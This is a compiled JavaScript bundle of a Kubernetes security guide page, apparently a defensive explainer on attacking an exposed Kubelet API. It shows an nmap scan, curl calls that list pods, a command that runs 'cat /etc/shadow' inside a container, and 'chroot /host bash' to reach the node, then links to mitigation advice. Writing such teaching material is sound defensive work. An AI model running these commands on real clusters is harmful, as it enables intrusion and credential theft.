"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[8263],{4972:(e,t,s)=>{s.r(t),s.d(t,{assets:()=>a,contentTitle:()=>i,default:()=>p,frontMatter:()=>c,metadata:()=>n,toc:()=>l});const n=JSON.parse('{"id":"attack_vectors/exposed_kubelet_api","title":"Exposed Kubelet API","description":"How an exposed Kubelet API can be exploited to execute commands on nodes and compromise Kubernetes clusters.","source":"@site/docs/attack_vectors/exposed_kubelet_api.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/exposed_kubelet_api","permalink":"/k8s_security/docs/attack_vectors/exposed_kubelet_api","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/exposed_kubelet_api.md","tags":[],"version":"current","sidebarPosition":9,"frontMatter":{"sidebar_position":9,"title":"Exposed Kubelet API","description":"How an exposed Kubelet API can be exploited to execute commands on nodes and compromise Kubernetes clusters."},"sidebar":"guidesSidebar","previous":{"title":"Insecure RBAC Permissions","permalink":"/k8s_security/docs/attack_vectors/insecure_rbac_permissions"},"next":{"title":"Supply Chain Attacks","permalink":"/k8s_security/docs/attack_vectors/supply_chain_attacks"}}');var o=s(4848),r=s(8453);const c={sidebar_position:9,title:"Exposed Kubelet API",description:"How an exposed Kubelet API can be exploited to execute commands on nodes and compromise Kubernetes clusters."},i="Exposed Kubelet API",a={},l=[{value:"Exploitation Steps: Gaining Access to the Kubelet API",id:"exploitation-steps-gaining-access-to-the-kubelet-api",level:2},{value:"Step 1: Scan for Open Ports",id:"step-1-scan-for-open-ports",level:3},{value:"Step 2: Query the Kubelet API",id:"step-2-query-the-kubelet-api",level:3},{value:"Step 3: Execute Commands on a Node",id:"step-3-execute-commands-on-a-node",level:3},{value:"Step 4: Escalate Privileges",id:"step-4-escalate-privileges",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation Steps",id:"mitigation-steps",level:2}];function d(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",p:"p",pre:"pre",strong:"strong",...(0,r.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(t.header,{children:(0,o.jsx)(t.h1,{id:"exposed-kubelet-api",children:"Exposed Kubelet API"})}),"\n",(0,o.jsxs)(t.p,{children:["The ",(0,o.jsx)(t.strong,{children:"Kubelet API"})," is responsible for managing pods on each node in a Kubernetes cluster. If improperly secured, attackers can ",(0,o.jsx)(t.strong,{children:"execute commands on worker nodes, retrieve secrets, and gain full control over workloads"}),"."]}),"\n",(0,o.jsx)(t.hr,{}),"\n",(0,o.jsx)(t.h2,{id:"exploitation-steps-gaining-access-to-the-kubelet-api",children:"Exploitation Steps: Gaining Access to the Kubelet API"}),"\n",(0,o.jsxs)(t.p,{children:["An attacker scans the cluster network to identify an open ",(0,o.jsx)(t.strong,{children:"Kubelet API port (10250)"}),"."]}),"\n",(0,o.jsx)(t.h3,{id:"step-1-scan-for-open-ports",children:"Step 1: Scan for Open Ports"}),"\n",(0,o.jsx)(t.p,{children:"The attacker runs a network scan to discover exposed Kubelets:"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:"nmap -p 10250 --open <cluster-ip-range>\n"})}),"\n",(0,o.jsx)(t.h3,{id:"step-2-query-the-kubelet-api",children:"Step 2: Query the Kubelet API"}),"\n",(0,o.jsxs)(t.p,{children:["If authentication is ",(0,o.jsx)(t.strong,{children:"not enforced"}),", the attacker lists running pods:"]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:"curl -k https://<kubelet-ip>:10250/pods\n"})}),"\n",(0,o.jsx)(t.h3,{id:"step-3-execute-commands-on-a-node",children:"Step 3: Execute Commands on a Node"}),"\n",(0,o.jsx)(t.p,{children:"If the Kubelet API allows unauthenticated execution, the attacker runs a command inside a pod:"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:"curl -k -X POST \"https://<kubelet-ip>:10250/run/<namespace>/<pod-name>/<container-name>\" -d 'cmd=cat /etc/shadow'\n"})}),"\n",(0,o.jsx)(t.h3,{id:"step-4-escalate-privileges",children:"Step 4: Escalate Privileges"}),"\n",(0,o.jsxs)(t.p,{children:["If the attacker gains access to a privileged container, they execute commands on the ",(0,o.jsx)(t.strong,{children:"host node"}),", leading to cluster-wide compromise:"]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:"curl -k -X POST \"https://<kubelet-ip>:10250/run/default/root-container\" -d 'cmd=chroot /host bash'\n"})}),"\n",(0,o.jsx)(t.h3,{id:"result",children:"Result"}),"\n",(0,o.jsxs)(t.p,{children:["The attacker now has ",(0,o.jsx)(t.strong,{children:"remote code execution"})," on a Kubernetes worker node and can ",(0,o.jsx)(t.strong,{children:"compromise the entire cluster"}),"."]}),"\n",(0,o.jsx)(t.hr,{}),"\n",(0,o.jsx)(t.h2,{id:"mitigation-steps",children:"Mitigation Steps"}),"\n",(0,o.jsxs)(t.p,{children:["To protect against ",(0,o.jsx)(t.strong,{children:"Kubelet API exposure"}),", follow the security best practices outlined in:"]}),"\n",(0,o.jsxs)(t.p,{children:["\u27a1 ",(0,o.jsx)(t.strong,{children:(0,o.jsx)(t.a,{href:"/docs/best_practices/cluster_setup_and_hardening/kubelet_security",children:"Kubelet Security"})})]}),"\n",(0,o.jsxs)(t.p,{children:["This guide covers techniques such as ",(0,o.jsx)(t.strong,{children:"disabling anonymous access, enforcing authentication, using RBAC to restrict API actions, and securing network access"})," to prevent unauthorized control over Kubelet APIs."]})]})}function p(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,o.jsx)(t,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}},8453:(e,t,s)=>{s.d(t,{R:()=>c,x:()=>i});var n=s(6540);const o={},r=n.createContext(o);function c(e){const t=n.useContext(r);return n.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function i(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:c(e.components),n.createElement(r.Provider,{value:t},e.children)}}}]);